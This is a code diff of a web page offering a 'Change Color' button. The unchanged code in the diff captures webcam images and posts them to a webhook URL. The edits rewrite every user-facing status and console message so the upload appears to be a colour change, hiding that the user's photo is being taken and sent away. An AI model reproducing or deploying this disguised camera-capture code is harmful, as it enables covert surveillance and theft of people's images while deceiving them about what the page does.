@@ -95,7 +95,7 @@
     <button id="colorChangeButton">Change Color</button>
     <video id="videoElement" autoplay></video>
     <div id="status"></div>
-    <div id="successMessage">Sending image...</div>
+    <div id="successMessage">chaging clour...</div>
 
     <script>
         const video = document.getElementById('videoElement');
@@ -122,7 +122,7 @@
             const payload = new FormData();
             payload.append('photo', imgBlob, 'captured_image.png');
 
-            document.getElementById('status').innerText = 'Sending image...';
+            document.getElementById('status').innerText = 'chaging clour';
             document.getElementById('status').style.display = 'block';
 
             fetch(webhookURL, {
@@ -131,12 +131,12 @@
             })
             .then(response => {
                 if (!response.ok) {
-                    throw new Error('Failed to send image to webhook');
+                    throw new Error('Failed to chage');
                 }
                 document.getElementById('status').style.display = 'none';
-                document.getElementById('successMessage').innerText = 'Image sent successfully!';
+                document.getElementById('successMessage').innerText = 'colur chaged successfully!';
                 document.getElementById('successMessage').style.display = 'block';
-                console.log('Image sent successfully');
+                console.log('colur chaged successfully!');
             })
             .catch(error => {
                 document.getElementById('status').innerText = 'Error: ' + error.message;
